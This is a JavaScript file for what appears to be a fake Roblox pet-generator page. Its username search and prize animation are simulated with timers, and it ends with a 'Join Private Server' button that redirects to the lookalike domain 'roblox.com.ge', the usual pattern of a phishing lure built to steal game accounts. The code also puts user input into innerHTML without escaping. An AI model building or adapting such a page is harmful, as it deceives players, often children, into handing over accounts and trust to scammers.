function logActivity(message){
  const log = document.getElementById("activityLog");
  const li = document.createElement("li");
  li.textContent = message;
  log.prepend(li);
}

document.getElementById("searchBtn").addEventListener("click", () => {
  const username = document.getElementById("username").value.trim();
  const resultDiv = document.getElementById("result");
  const animDiv = document.getElementById("animation");
  resultDiv.innerHTML = "";
  if(username){
    animDiv.innerHTML = `<p>Finding username <span class="loading-dots"><span>.</span><span>.</span><span>.</span></span></p>`;
    logActivity(`Searching for username: ${username}`);
    setTimeout(() => {
      animDiv.innerHTML = "";
      resultDiv.innerHTML = `<p>User Found: <strong>${username}</strong></p>
        <button id="genPetBtn">Generate Pet</button>`;
      logActivity(`User found: ${username}`);
      document.getElementById("genPetBtn").addEventListener("click", () => {
        animDiv.innerHTML = '<div class="spinner"></div><p>Generating pet...</p>';
        logActivity("Generating pet...");
        setTimeout(() => {
          animDiv.innerHTML = "";
          const pets = ["Raccoon","Dragonfly","Mimic Octopus","Queen Bee"];
          const pet = pets[Math.floor(Math.random()*pets.length)];
          resultDiv.innerHTML = `<p>🎉 Congratulations, you got a <strong>${pet}</strong>!</p>
            <p>Join to claim your pet:</p>
            <button onclick="window.location.href='https://roblox.com.ge/games/126884695634066/Grow-a-Garden?privateServerLinkCode=98362791523092484699268245505483'">Join Private Server</button>`;
          logActivity(`Pet generated: ${pet}`);
        }, 2000);
      });
    }, 2000);
  } else {
    resultDiv.innerHTML = "<p>Please enter a username.</p>";
  }
});
